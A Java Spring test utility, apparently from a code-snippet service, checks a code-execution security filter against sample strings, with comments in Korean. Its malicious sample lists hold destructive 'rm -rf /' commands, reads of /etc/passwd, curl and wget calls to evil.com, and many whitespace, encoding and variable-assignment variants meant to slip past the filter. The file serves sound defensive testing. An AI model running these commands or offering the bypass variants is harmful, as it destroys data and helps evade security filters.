package com.snippethub.api.security;

import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

import java.util.Arrays;
import java.util.List;

@Component
@Slf4j
public class SecurityTestUtils {

    // 악성 코드 샘플들
    private static final List<String> MALICIOUS_CODE_SAMPLES = Arrays.asList(
        // 시스템 명령어 실행
        "rm -rf /",
        "sudo rm -rf /",
        "system('rm -rf /')",
        "os.system('rm -rf /')",
        "Runtime.getRuntime().exec('rm -rf /')",
        "ProcessBuilder('rm', '-rf', '/').start()",
        
        // 인코딩 우회 시도
        "rm%20-rf%20/",
        "rm&#32;-rf&#32;/",
        "rm\\u0020-rf\\u0020/",
        "rm\\x20-rf\\x20/",
        "rm\\040-rf\\040/",
        
        // 변수 할당 후 실행
        "cmd = 'rm -rf /'; exec(cmd)",
        "var command = 'rm -rf /'; system(command)",
        "String cmd = 'rm -rf /'; Runtime.getRuntime().exec(cmd)",
        
        // 파일 시스템 접근
        "cat /etc/passwd",
        "open('/etc/passwd', 'r')",
        "new File('/etc/passwd').readLines()",
        "with open('/etc/passwd') as f: print(f.read())",
        
        // 네트워크 접근
        "curl http://evil.com",
        "wget http://evil.com",
        "requests.get('http://evil.com')",
        "new URL('http://evil.com').openConnection()",
        
        // 무한 루프
        "while(true) {}",
        "for(;;) {}",
        "while(1) { sleep(1); }",
        
        // 리플렉션
        "Class.forName('java.lang.Runtime').getMethod('exec', String.class).invoke(null, 'rm -rf /')",
        "getattr(__import__('os'), 'system')('rm -rf /')",
        "eval('rm -rf /')",
        
        // 명령어 치환
        "${rm -rf /}",
        "$(rm -rf /)",
        "`rm -rf /`"
    );

    // 안전한 코드 샘플들
    private static final List<String> SAFE_CODE_SAMPLES = Arrays.asList(
        // Java
        "public class Main { public static void main(String[] args) { System.out.println('Hello World'); } }",
        "int sum = 0; for(int i = 1; i <= 10; i++) { sum += i; } System.out.println(sum);",
        
        // Python
        "print('Hello World')",
        "sum = 0; for i in range(1, 11): sum += i; print(sum)",
        "def factorial(n): return 1 if n <= 1 else n * factorial(n-1)",
        
        // JavaScript
        "console.log('Hello World')",
        "let sum = 0; for(let i = 1; i <= 10; i++) { sum += i; } console.log(sum);",
        "function factorial(n) { return n <= 1 ? 1 : n * factorial(n-1); }",
        
        // C
        "#include <stdio.h> int main() { printf('Hello World\\n'); return 0; }",
        "int sum = 0; for(int i = 1; i <= 10; i++) { sum += i; } printf('%d\\n', sum);"
    );

    /**
     * 보안 필터 테스트 실행
     */
    public void runSecurityTests(CodeExecutionSecurityFilter securityFilter) {
        log.info("=== 보안 필터 테스트 시작 ===");
        
        int maliciousBlocked = 0;
        int safeAllowed = 0;
        
        // 악성 코드 테스트
        log.info("--- 악성 코드 차단 테스트 ---");
        for (String maliciousCode : MALICIOUS_CODE_SAMPLES) {
            boolean isBlocked = !securityFilter.validateCodeContent(maliciousCode, "java");
            if (isBlocked) {
                maliciousBlocked++;
                log.info("[BLOCKED] 차단됨: {}", maliciousCode);
            } else {
                log.error("[FAILED] 차단 실패: {}", maliciousCode);
            }
        }
        
        // 안전한 코드 테스트
        log.info("--- 안전한 코드 허용 테스트 ---");
        for (String safeCode : SAFE_CODE_SAMPLES) {
            boolean isAllowed = securityFilter.validateCodeContent(safeCode, "java");
            if (isAllowed) {
                safeAllowed++;
                log.info("[ALLOWED] 허용됨: {}", safeCode.substring(0, Math.min(50, safeCode.length())) + "...");
            } else {
                log.error("[BLOCKED] 잘못 차단됨: {}", safeCode.substring(0, Math.min(50, safeCode.length())) + "...");
            }
        }
        
        // 결과 요약
        log.info("=== 테스트 결과 요약 ===");
        log.info("악성 코드 차단률: {}/{} ({:.1f}%)", 
                maliciousBlocked, MALICIOUS_CODE_SAMPLES.size(), 
                (double) maliciousBlocked / MALICIOUS_CODE_SAMPLES.size() * 100);
        log.info("안전한 코드 허용률: {}/{} ({:.1f}%)", 
                safeAllowed, SAFE_CODE_SAMPLES.size(), 
                (double) safeAllowed / SAFE_CODE_SAMPLES.size() * 100);
        
        if (maliciousBlocked == MALICIOUS_CODE_SAMPLES.size() && 
            safeAllowed == SAFE_CODE_SAMPLES.size()) {
            log.info("[SUCCESS] 모든 테스트 통과!");
        } else {
            log.warn("[WARNING] 일부 테스트 실패");
        }
    }

    /**
     * 특정 보안 패턴 테스트
     */
    public void testSpecificPatterns(CodeExecutionSecurityFilter securityFilter) {
        log.info("=== 특정 보안 패턴 테스트 ===");
        
        // 정규식 우회 테스트
        testRegexBypass(securityFilter);
        
        // 인코딩 우회 테스트
        testEncodingBypass(securityFilter);
        
        // 변수 우회 테스트
        testVariableBypass(securityFilter);
    }

    private void testRegexBypass(CodeExecutionSecurityFilter securityFilter) {
        log.info("--- 정규식 우회 테스트 ---");
        
        String[] bypassAttempts = {
            "rm -r f",           // 공백 추가
            "rm\t-rf",           // 탭 문자
            "rm\u0020-rf",       // 유니코드 공백
            "rm\u00A0-rf",       // non-breaking space
            "rm\u2000-rf",       // en quad
            "rm\u2001-rf",       // em quad
            "rm\u2002-rf",       // en space
            "rm\u2003-rf",       // em space
            "rm\u2004-rf",       // three-per-em space
            "rm\u2005-rf",       // four-per-em space
            "rm\u2006-rf",       // six-per-em space
            "rm\u2007-rf",       // figure space
            "rm\u2008-rf",       // punctuation space
            "rm\u2009-rf",       // thin space
            "rm\u200A-rf",       // hair space
            "rm\u202F-rf",       // narrow no-break space
            "rm\u205F-rf",       // medium mathematical space
            "rm\u3000-rf"        // ideographic space
        };
        
        for (String attempt : bypassAttempts) {
            boolean isBlocked = !securityFilter.validateCodeContent(attempt, "bash");
            log.info("[{}] {}: {}", isBlocked ? "BLOCKED" : "BYPASSED", attempt, isBlocked ? "차단됨" : "우회됨");
        }
    }

    private void testEncodingBypass(CodeExecutionSecurityFilter securityFilter) {
        log.info("--- 인코딩 우회 테스트 ---");
        
        String[] encodingAttempts = {
            "rm%20-rf%20/",      // URL 인코딩
            "rm&#32;-rf&#32;/",  // HTML 엔티티
            "rm\\u0020-rf\\u0020/", // 유니코드 이스케이프
            "rm\\x20-rf\\x20/",  // 16진수 이스케이프
            "rm\\040-rf\\040/",  // 8진수 이스케이프
            "rm\\u00A0-rf\\u00A0/", // non-breaking space
            "rm\\u2000-rf\\u2000/", // en quad
            "rm\\u2001-rf\\u2001/"  // em quad
        };
        
        for (String attempt : encodingAttempts) {
            boolean isBlocked = !securityFilter.validateCodeContent(attempt, "bash");
            log.info("[{}] {}: {}", isBlocked ? "BLOCKED" : "BYPASSED", attempt, isBlocked ? "차단됨" : "우회됨");
        }
    }

    private void testVariableBypass(CodeExecutionSecurityFilter securityFilter) {
        log.info("--- 변수 우회 테스트 ---");
        
        String[] variableAttempts = {
            "cmd = 'rm -rf /'; exec(cmd)",
            "var command = 'rm -rf /'; system(command)",
            "String cmd = 'rm -rf /'; Runtime.getRuntime().exec(cmd)",
            "let cmd = 'rm -rf /'; eval(cmd)",
            "const cmd = 'rm -rf /'; Function(cmd)()",
            "cmd = 'rm -rf /'; os.system(cmd)",
            "command = 'rm -rf /'; subprocess.call(command, shell=True)"
        };
        
        for (String attempt : variableAttempts) {
            boolean isBlocked = !securityFilter.validateCodeContent(attempt, "python");
            log.info("[{}] {}: {}", isBlocked ? "BLOCKED" : "BYPASSED", attempt, isBlocked ? "차단됨" : "우회됨");
        }
    }

    /**
     * 보안 테스트 리포트 생성
     */
    public String generateSecurityReport(CodeExecutionSecurityFilter securityFilter) {
        StringBuilder report = new StringBuilder();
        report.append("=== 코드 실행 보안 테스트 리포트 ===\n\n");
        
        // 악성 코드 차단 테스트
        int maliciousBlocked = 0;
        for (String maliciousCode : MALICIOUS_CODE_SAMPLES) {
            if (!securityFilter.validateCodeContent(maliciousCode, "java")) {
                maliciousBlocked++;
            }
        }
        
        // 안전한 코드 허용 테스트
        int safeAllowed = 0;
        for (String safeCode : SAFE_CODE_SAMPLES) {
            if (securityFilter.validateCodeContent(safeCode, "java")) {
                safeAllowed++;
            }
        }
        
        report.append("테스트 결과:\n");
        report.append(String.format("- 악성 코드 차단률: %d/%d (%.1f%%)\n", 
                maliciousBlocked, MALICIOUS_CODE_SAMPLES.size(), 
                (double) maliciousBlocked / MALICIOUS_CODE_SAMPLES.size() * 100));
        report.append(String.format("- 안전한 코드 허용률: %d/%d (%.1f%%)\n", 
                safeAllowed, SAFE_CODE_SAMPLES.size(), 
                (double) safeAllowed / SAFE_CODE_SAMPLES.size() * 100));
        
        report.append("\n보안 등급: ");
        double securityScore = (double) maliciousBlocked / MALICIOUS_CODE_SAMPLES.size() * 100;
        if (securityScore >= 95) {
            report.append("A+ (매우 안전)\n");
        } else if (securityScore >= 90) {
            report.append("A (안전)\n");
        } else if (securityScore >= 80) {
            report.append("B (양호)\n");
        } else if (securityScore >= 70) {
            report.append("C (보통)\n");
        } else {
            report.append("D (위험)\n");
        }
        
        return report.toString();
    }
}
